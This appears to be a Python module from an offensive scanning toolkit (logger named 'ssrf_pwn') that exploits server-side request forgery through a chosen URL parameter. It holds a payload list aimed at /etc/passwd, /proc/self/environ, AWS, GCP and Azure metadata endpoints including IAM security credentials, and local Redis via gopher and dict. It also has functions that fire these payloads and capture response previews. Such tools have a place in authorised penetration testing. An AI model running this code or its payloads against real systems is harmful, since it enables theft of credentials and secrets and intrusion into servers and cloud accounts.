import re
from typing import Optional, Dict
import requests

from tools.log_utils import get_logger

logger = get_logger("ssrf_pwn")

SSRF_EXPLOIT_URLS = [
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "http://127.0.0.1:8080/_env",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/",
    "file:///proc/self/environ",
]

CLOUD_EVIDENCE = {
    "aws": [r"ami-id", r"instance-id", r"security-credentials", r"AWS_"],
    "gcp": [r"google", r"computeMetadata"],
    "azure": [r"azure", r"vmId", r"osType"],
}


def check_file_read(url: str, param: str, sess=None, timeout=10.0) -> list:
    if sess is None:
        sess = requests.Session()
    results = []
    for target in SSRF_EXPLOIT_URLS:
        if not target.startswith("file"):
            continue
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, target), timeout=timeout, verify=False)
            if len(r.text) > 50:
                results.append({"target": target[:30], "size": len(r.text), "preview": r.text[:100]})
        except Exception as e:
            logger.debug("file_read %s: %s", target[:20], e)
    return results


def check_cloud_metadata(url: str, param: str, sess=None, timeout=10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {}
    for target in SSRF_EXPLOIT_URLS:
        if not target.startswith("http://169") and not target.startswith("http://metadata"):
            continue
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, target), timeout=timeout, verify=False)
            if len(r.text) > 20:
                for cloud, patterns in CLOUD_EVIDENCE.items():
                    for pat in patterns:
                        if re.search(pat, r.text, re.IGNORECASE):
                            result[cloud] = {"url": target[:30], "size": len(r.text),
                                              "preview": r.text[:150]}
                            break
        except Exception as e:
            logger.debug("cloud_meta %s: %s", target[:20], e)
    return result


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "files": [], "cloud_metadata": {}, "findings": []}

    result["files"] = check_file_read(url, param, sess, timeout)
    if result["files"]:
        result["vulnerable"] = True
        result["findings"].append("ssrf file read: %d files" % len(result["files"]))

    result["cloud_metadata"] = check_cloud_metadata(url, param, sess, timeout)
    if result["cloud_metadata"]:
        result["vulnerable"] = True
        for cloud in result["cloud_metadata"]:
            result["findings"].append("ssrf cloud metadata: %s" % cloud)

    return result
